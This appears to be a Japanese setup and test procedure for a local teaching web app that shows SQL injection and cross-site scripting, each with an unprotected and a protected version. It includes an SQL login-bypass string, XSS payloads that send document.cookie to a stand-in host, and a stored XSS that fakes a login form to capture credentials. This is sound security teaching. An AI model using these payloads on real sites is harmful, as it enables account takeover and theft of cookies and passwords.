
■構築手順■■■

・DBの構築
  Cドライブ直下にmembers_db.sqlを配置し、MySQL上で
  『mysql> \. c:\members_db.sql』コマンドを実行して、
  ２つのテーブルを持つmembers_dbを構築する｡

・プロジェクトの作成
  eclipse内に『secure』という名前で新規の動的webプロジェクトを作成し、
  その中に「プログラム類」フォルダに入っている各ファイルを格納する。


■確認手順■■■


【Ａ】SQLインジェクションについて確認する。

  ①：ユーザー／パス認証のＯＫパターンの確認

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の一番上にある「SQL文を単純に連結して生成」
      欄に『natsume』と『soseki』を入力して[照会]を押下する。
   3. 結果画面にて「登録済メンバーです。」を確認する。


  ②：ユーザー／パス認証のＮＧパターンの確認

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の一番上にある「SQL文を単純に連結して生成」
      欄に『aaa』と『bbb』を入力して[照会]を押下する。
   3. 結果画面にて「※未登録です！※」を確認する。


  ③：悪意のある認証入力をされた時の確認（未対策）

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の一番上にある「SQL文を単純に連結して生成」
      欄の名前に『1' or '1' = '1';#』
      パスワードに『1』を入力して[照会]を押下する。
   3. 結果画面にて「登録済メンバーです。」が出ている事を確認する。

   生成されるSQL文>
           SELECT * FROM members_tbl
           WHERE name='1' or '1' = '1'; ←条件に『'1'='1'』がある
           #' and password='1'            ので､常にtrueと判断される｡
          ↑
         『#』以降はMySQL的にコメントとして扱われるので無効。


  ④：悪意のある認証入力をされた時の確認（対策済み）

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の上から二番目にある「SQL文をプリペアード
      ステートメントで生成」欄の
      名前に『1' or '1' = '1';#』
      パスワードに『1』を入力して[照会]を押下する。
   3. 結果画面にて「※未登録です！※』」を確認する。


【Ｂ】クロスサイトスクリプティングについて確認する。

  ①：通常の入力→表示のパターン

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の上から三番目にある「そのまま確認画面に
      表示する入力」欄に『あいうえお』を入力して[送信]を押下する。
   3. 結果画面にて「あいうえお」を確認する。


  ②：悪意のある入力→表示→別ページへ強制遷移のパターン（未対策）

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の上から三番目にある「そのまま確認画面に
      表示する入力」欄に
     『<script>window.location='http://sonna.saito.naiyo/trap.jsp?'+document.cookie;</script><!--』
      を入力して[送信]を押下する。
   3. 存在しないサイトに強制的に遷移している事、およびinput.jspの
      32行目にて発行したクッキーデータ(名前:naisyo 値:himitu)が
      パラメータとしてURLアドレスの後ろに付いている事を確認する。


  ③：悪意のある入力→表示→別ページへ強制遷移のパターン（対策済み）

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の上から四番目にある「エスケープして
      確認画面に表示する入力」欄に
     『<script>window.location='http://sonna.saito.naiyo/trap.jsp?'+document.cookie;</script><!--』
      を入力して[送信]を押下する。
   3. 結果画面にそのままの内容が表示されている事を確認する。


  ④：悪意のある入力→表示→アラート表示のパターン（未対策）

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の上から三番目にある「そのまま確認画面に
      表示する入力」欄に
     『<script>alert(document.cookie)</script><!--』
      を入力して[送信]を押下する。
   3. アラートウインドウがポップしている事、およびinput.jspの
      32行目にて発行したクッキーデータ(名前:naisyo 値:himitu)が
      アラート内に表示されている事を確認する。


  ⑤：悪意のある入力→表示→アラート表示のパターン（対策済み）

   1. input.jspをサーバーで実行する。
   2. 4パターンある入力項目の上から四番目にある「エスケープして
      確認画面に表示する入力」欄に
     『<script>alert(document.cookie)</script><!--』
      を入力して[送信]を押下する。
   3. 結果画面にそのままの内容が表示されている事を確認する。


【Ｃ】クロスサイトスクリプティングの別パターン

  ①：通常の入力→テーブルへ登録→テーブル全件表示のパターン

   1. in_out.jspをサーバーで実行する。
   2. 2パターンある入力項目の上にある「SQL文を単純に連結～」欄に
     『あいうえお』を入力して[送信]を押下する。
   3. 画面下方にtext_tblの全件が出力されている事を確認する。
      例: dummy1
          dummy2
          dummy3
          あいうえお


  ②：悪意のある入力→テーブルへ登録→テーブル全件表示
             →入力項目を表示した上、別のページへ遷移するパターン

   1. in_out.jspをサーバーで実行する。
   2. 2パターンある入力項目の上にある「SQL文を単純に連結～」欄に
     『<script>document.body.innerHTML = \'<form method=\"GET\" action=\"http://sonna.saito.naiyo\">\<div>ID: <input type=\"text\" name=\"id\"></div>\<div>PW: <input type=\"password\" name=\"password\"></div>\\<input type=\"submit\" value=\"Login\">\\</form>\';</script>』
     を入力して[送信]を押下する。
   3.アドレス欄が「http://localhost:8080/secure/control2」(サーバーや
     プロジェクトはそのまま)だが、画面上にidとパスワードの入力欄が
     表示されている事を確認する。
   4.idに『aaa』、パスワードに『bbb』を入力して[Login]を押下する。
   5.遷移先が存在しないページなので画面上には何も表示されないが、
     URLアドレス欄が「http://sonna.saito.naiyo/?id=aaa&password=nnn」
     となっている事を確認する。

   === この時点で､悪意のある入力がDBに登録されてしまっている。 ===

   6. in_out.jspをサーバーで実行する。
   7. 2パターンある入力項目の上にある「SQL文を単純に連結～」欄に
     『あいうえお』を入力して[送信]を押下する。
   8. 画面下方にtext_tblの全件を表示しようとするが、テーブル内に
      悪意のあるデータが存在する為、id／パスワードの入力画面が
      表示されてしまう。


  ③：DB内に悪意のあるデータがあるが、表示のタイミングで
      タグをエスケープするパターン

   1. in_out.jspの35行目(タグエスケープ編集)をコメントから外し、
      34行目(タグそのまま編集)をコメント化する。
   2. in_out.jspをサーバーで実行する。
   3. 2パターンある入力項目の上にある「SQL文を単純に連結～」欄に
     『<script>document.body.innerHTML = \'<form method=\"GET\" action=\"http://sonna.saito.naiyo\">\<div>ID: <input type=\"text\" name=\"id\"></div>\<div>PW: <input type=\"password\" name=\"password\"></div>\\<input type=\"submit\" value=\"Login\">\\</form>\';</script>』
     を入力して[送信]を押下する。
   4. タグがエスケープされ、悪意のあるスクリプトが実行されない事を
      確認する。

  ④：DB内に悪意のあるデータを登録するタイミングでエスケープする
      パターン。

   1. 現在、悪意のあるデータが入っているDBをリセットする為、
      コマンドプロンプトにて『mysql> \. c:\members_db.sql』を実行する。
   2. in_out.jspの35行目(タグエスケープ編集)をコメント化、
      34行目(タグそのまま編集)をコメントから外す。
   3. in_out.jspをサーバーで実行する。
   4. 2パターンある入力項目の二番目にある「SQL文をプリペアード～」欄に
     『<script>document.body.innerHTML = \'<form method=\"GET\" action=\"http://sonna.saito.naiyo\">\<div>ID: <input type=\"text\" name=\"id\"></div>\<div>PW: <input type=\"password\" name=\"password\"></div>\\<input type=\"submit\" value=\"Login\">\\</form>\';</script>』
     を入力して[送信]を押下する。
   5. 画面下方にtext_tblの全件が出力されている事を確認する。
      例: dummy1
          dummy2
          dummy3
   6. ブラウザのソースを表示して、scriptタグ自体がエスケープされて
      いない為、画面上には編集されていないが、DB上には単純文字列として
      登録されている為、scriptが機能していない事を確認する。



それ以外にも、「Servers」プロジェクトのweb.xml 503～505行目にある
セッションタイムアウト時間を短くする事で、のぞき見などに対して
(ある程度)対応することができます。


